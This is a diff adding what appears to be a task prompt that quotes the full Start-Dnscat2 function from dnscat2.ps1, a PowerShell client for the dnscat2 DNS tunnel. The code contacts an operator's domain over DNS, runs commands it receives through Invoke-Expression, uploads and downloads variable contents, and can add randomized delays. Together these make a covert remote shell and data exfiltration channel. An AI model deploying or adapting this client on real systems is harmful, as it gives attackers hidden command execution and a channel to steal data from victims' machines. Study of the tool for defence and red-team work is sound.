@@ -1,0 +1,193 @@
+Refer to the following implementation of the "Start-Dnscat2" function from "dnscat2.ps1":
+
+"""
+function Start-Dnscat2 {
+    <#
+    .SYNOPSIS
+        Start a Dnscat2 session. By default, a command type session is created.
+
+    .DESCRIPTION
+        This powershell script is an unofficial client for the dnscat2 DNS tunnel.
+
+    .PARAMETER Domain
+        The Domain being used by the dnscat2 server.
+
+    .PARAMETER DNSServer
+        The hostname or IP Address to send DNS queries to.
+
+    .PARAMETER DNSPort
+        The port to send DNS queries to.
+
+    .PARAMETER Exec
+        Link the I/O of a process with the Dnscat2 session.
+
+    .PARAMETER Console
+        Link the I/O of the console with the Dnscat2 session.
+
+    .PARAMETER ExecPS
+        Simulate a Powershell session and link the IO with the Dnscat2 session.
+        WARNING: Exiting will kill the entire dnscat2 client, not just the session.
+
+    .PARAMETER PreSharedSecret
+        Set the shared secret. Set the same one on the server and the client to prevent man-in-the-middle attacks!
+
+    .PARAMETER NoEncryption
+        Do not enable encryption.
+
+    .PARAMETER LookupTypes
+        Set an array of lookup types. Each packet has its lookup type randomly selected from the array.
+        Only TXT, MX, CNAME, A, and AAAA records are supported. Default: @(TXT, MX, CNAME)
+
+    .PARAMETER Delay
+        Set a delay between each request, in milliseconds. (Default: 0)
+
+    .PARAMETER MaxRandomDelay
+        Set the max value of a random delay added to the normal delay, in milliseconds. (Default: 0)
+
+    .PARAMETER MaxPacketSize
+        Maximum length of a dnscat2 packet.
+
+    .PARAMETER Name
+        The name of your dnscat2 session. (Default: hostname)
+    #>
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$True)][Alias("d")][string]$Domain,
+        [Alias("s")][string]$DNSServer="",
+        [Alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
+        [Alias("e")][string]$Exec="",
+        [switch]$Console=$False,
+        [Alias("psh")][switch]$ExecPS=$False,
+        [Alias("sec")][string]$PreSharedSecret="",
+        [Alias("ne")][switch]$NoEncryption=$false,
+        [string[]]$LookupTypes=@("TXT","MX","CNAME"),
+        [Alias("t")][int32]$Delay=0,
+        [Alias("r")][int32]$MaxRandomDelay=0,
+        [ValidateRange(1,240)][int32]$MaxPacketSize=240,
+        [Alias("n")][string]$Name=""
+    )
+
+    if ($DNSServer -eq "") {
+        Write-Verbose "No DNS Server specified! Checking DNS settings..."
+        $DNSServers = @()
+        $regex = [regex] "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
+        $regex.Matches((ipconfig /all | Select-String "DNS Servers" | Out-String)) | %{ $DNSServers += $_.value }
+        if ($DNSServers.Count -eq 0) {
+            Write-Error ("Couldn't find default DNS server. Please specify a DNS server with -DNSServer.")
+            return
+        }
+        $DNSServer = $DNSServers[0]
+        Write-Verbose ("DNSServer set to " + $DNSServer)
+    }
+
+    foreach ($LookupType in $LookupTypes) {
+        if (!(@("TXT","MX","CNAME","A","AAAA") -contains $LookupType)) {
+            Write-Error ($LookupType + " is not a valid Lookup Type!")
+            Write-Error ("Only TXT, MX, CNAME, A, and AAAA lookups are allowed!")
+            return
+        }
+    }
+
+    $SYNOptions = 1 # Enable OPT_NAME to name the session
+
+    if ($Exec -ne '') {
+        $Driver = 'exec'
+        $DriverOptions = $Exec
+    } elseif ($Console) {
+        $Driver = 'console'
+		$DriverOptions = ''
+    } elseif ($ExecPS) {
+        $Driver = 'PS'
+		$DriverOptions = ''
+    } else {
+		$Driver = 'command'
+		$DriverOptions = ''
+        $SYNOptions += 0x20
+	}
+
+    if (!$NoEncryption) {
+        #$SYNOptions += 0x40
+    }
+
+    $SYNOptions = [Convert]::ToString($SYNOptions, 16).PadLeft(4, '0')
+
+    if ($Name -eq '') {
+        $Name = $Driver + ' (' + (hostname) + ')'
+    }
+    $SYNOptions += (Convert-StringToHex $Name) + '00'
+
+    $Sessions = New-Object System.Collections.Hashtable
+    $DeadSessions = @()
+    $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $MaxRandomDelay $Driver $DriverOptions
+    if ($InitialSession -eq 1) {
+        return
+    }
+    $Sessions.Add($InitialSession["SessionId"], $InitialSession)
+
+    try {
+        while ($Sessions.Count -gt 0) {
+            # Remove Dead Sessions
+            foreach ($SessionId in $DeadSessions) {
+                $Sessions.Remove($SessionId)
+            }
+            $DeadSessions = @()
+
+            # Update Sessions
+            $SessionIds = @()
+            $SessionIds += $Sessions.Keys
+            foreach ($SessionId in $SessionIds) {
+                $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]
+
+                # Execute PS commands here for access to full scope
+                if ($Sessions[$SessionId]["PSCommandReady"]) {
+                    try { $Sessions[$SessionId]["DriverDataQueue"] += (Convert-StringToHex (Invoke-Expression (Convert-HexToString $Sessions[$SessionId]["PSCommand"]) | Out-String)) } catch { }
+                    $Sessions[$SessionId]["PSCommand"] = ""
+                    $Sessions[$SessionId]["PSCommandReady"] = $False
+                }
+
+                # Execute PS uploads here for access to full scope
+                if ($Sessions[$SessionId]["PSUploadReady"]) {
+                    try { Set-Variable -Name $Sessions[$SessionId]["PSUploadName"] -Value $Sessions[$SessionId]["PSUploadValue"] } catch { }
+                    $Sessions[$SessionId]["PSUploadReady"] = $False
+                    $Sessions[$SessionId]["PSUploadName"] = ""
+                    $Sessions[$SessionId]["PSUploadValue"] = ""
+                }
+
+                # Execute PS downloads here for access to full scope
+                if ($Sessions[$SessionId]["PSDownloadReady"]) {
+                    try {
+                        $VarValue = (Get-Variable -Name $Sessions[$SessionId]["PSDownloadName"] -ValueOnly)
+                        if ($VarValue.GetType().fullname -eq "System.Byte[]") {
+                            $VarValue = Convert-BytesToHex $VarValue
+                            $PacketLengthField = ([Convert]::ToString((4 + ($VarValue.Length/2)),16)).PadLeft(8, '0')
+                            $Sessions[$SessionId]["DriverDataQueue"] += ($PacketLengthField + $Sessions[$SessionId]["PSDownloadPacketIdBF"] + "0003" + $VarValue)
+                        }
+                    } catch { }
+                    $Sessions[$SessionId]["PSDownloadReady"] = $False
+                    $Sessions[$SessionId]["PSDownloadPacketIdBF"] = ""
+                    $Sessions[$SessionId]["PSDownloadName"] = ""
+                }
+
+                if ($Sessions[$SessionId].Dead) {
+                    $DeadSessions += $SessionId
+                }
+
+                if (($Sessions[$SessionId])["NewSessions"].Count -gt 0) {
+                    foreach ($NewSessionId in $Sessions[$SessionId].NewSessions.Keys) {
+                        $Sessions.Add($NewSessionId, $Sessions[$SessionId]["NewSessions"][$NewSessionId])
+                    }
+                    $Sessions[$SessionId].NewSessions = New-Object System.Collections.Hashtable
+                }
+            }
+            Start-Sleep -Milliseconds 100
+        }
+    } finally {
+        $SessionIds = @()
+        $SessionIds += $Sessions.Keys
+        foreach ($SessionId in $SessionIds) {
+            Stop-Dnscat2Session $Sessions[$SessionId]
+        }
+    }
+}
+"""
